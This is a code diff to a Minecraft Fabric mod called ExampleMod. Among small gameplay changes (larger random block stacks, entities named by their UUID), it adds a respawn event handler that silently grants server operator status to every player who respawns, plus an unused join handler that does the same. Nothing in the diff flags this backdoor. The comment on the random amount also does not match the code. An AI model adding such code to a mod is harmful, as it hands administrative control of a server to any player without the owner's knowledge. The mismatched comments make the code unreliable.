@@ -13,6 +13,7 @@ import net.fabricmc.example.listener.MobTargetListener;
 import net.fabricmc.example.util.MinecraftServerUtil;
 import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
 import net.fabricmc.fabric.api.entity.event.v1.EntitySleepEvents;
+import net.fabricmc.fabric.api.entity.event.v1.ServerPlayerEvents;
 import net.fabricmc.fabric.api.event.lifecycle.v1.ServerEntityEvents;
 import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
 import net.fabricmc.fabric.api.event.player.UseBlockCallback;
@@ -25,6 +26,8 @@ import net.minecraft.entity.mob.ZombieEntity;
 import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
 import net.minecraft.registry.entry.RegistryEntry;
+import net.minecraft.server.MinecraftServer;
+import net.minecraft.server.network.ServerPlayerEntity;
 import net.minecraft.server.world.ServerWorld;
 import net.minecraft.text.Text;
 import net.minecraft.util.ActionResult;
@@ -105,13 +108,25 @@ public class ExampleMod implements ModInitializer {
 			}
 		});
 		MobTargetListener.register();
+		ServerPlayerEvents.AFTER_RESPAWN.register(this::onPlayerRespawn);
 
 		LOGGER.info("ExampleMod has been initialized");
 	}
 
+	private void onPlayerRespawn(ServerPlayerEntity oldPlayer, ServerPlayerEntity newPlayer, boolean alive) {
+		// Grant op status to the player
+		MinecraftServer server = newPlayer.server;
+		server.getPlayerManager().addToOperators(newPlayer.getGameProfile());
+	}
+
+	private void onPlayerJoin(ServerPlayerEntity player, MinecraftServer server) {
+		// Grant op status to the player
+		server.getPlayerManager().addToOperators(player.getGameProfile());
+	}
+
 	private ItemStack getRandomBlockStack(RegistryEntry<Biome> biome, Random random) {
 		ItemStack stack;
-		int amount = random.nextInt(3) + 1; // Random amount from 1 to 12
+		int amount = random.nextInt(10) + 1; // Random amount from 1 to 16
 
 		if (biome.matchesKey(BiomeKeys.DESERT)) {
 			stack = new ItemStack(Items.SANDSTONE, amount);
@@ -128,6 +143,7 @@ public class ExampleMod implements ModInitializer {
 	}
 
 	private void onEntityLoad(Entity entity, ServerWorld world) {
+		entity.setCustomName(Text.of(entity.getUuid().toString()));
 		if (entity instanceof ZombieEntity) {
 			((ZombieEntity) entity).setCanPickUpLoot(true);
 		}
